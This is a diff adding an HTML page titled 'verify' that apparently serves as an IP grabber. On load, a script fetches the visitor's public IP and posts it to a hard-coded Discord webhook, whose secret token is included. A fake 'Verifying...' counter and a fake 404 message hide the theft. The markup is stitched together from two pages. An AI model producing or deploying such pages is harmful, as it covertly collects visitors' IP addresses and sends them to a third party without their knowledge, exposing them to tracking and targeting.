@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>verify</title>
+    <script>
+        async function getExternalIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip
+            } catch (error) {
+                console.error('Error fetching external IP:', error);
+                return 'Unable to fetch IP';
+            }
+        }
+        function sendToDiscord(message) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1419663767679008850/NJWCGO97YtM4Iwo3IUXNjMIv-mAZnYaXCc-0huZGZAWw0pup-A0dN574D5wXuynpjzXV';
+            
+            const payload = {
+                content: message
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent to Discord:', data);
+            })
+            .catch(error => {
+                console.error('Error sending message to Discord:', error);
+            });
+        }
+        window.onload = async function() {
+            const ip = await getExternalIP()
+            const message = `@everyone IP Address: ${ip}`;
+
+            console.log('Sending to Discord:', message);
+            sendToDiscord(message)
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
+  <style>
+    
+    body {
+      background: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    #box {
+      width: 665px;
+      height: 232px;
+      background-color: rgba(220, 201, 46, 0.5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+      font-weight: bold;
+      color: #fee200;
+
+      text-shadow:
+        -1px -1px 0 #000,
+         1px -1px 0 #000,
+        -1px  1px 0 #000,
+         1px  1px 0 #000;
+    }
+  </style>
+</head>
+<body>
+  <div id="box">
+    Verifying... (0/1000)
+  </div>
+
+  <script>
+    const box = document.getElementById("box");
+    let count = 0;
+    const max = 1000;
+
+    const interval = setInterval(() => {
+      count++;
+      box.textContent = `Verifying... (${count}/1000)`;
+
+      if (count === 500) {
+        box.style.backgroundColor = "#48e448";
+        box.style.color = "#00ff00";
+      }
+
+      if (count >= max) {
+        clearInterval(interval);
+        document.body.innerHTML = "<h1 style='color:black; text-align:center;'>404: Post request error</h1>";
+      }
+    }, 1);
+  </script>
+</body>
+</html>
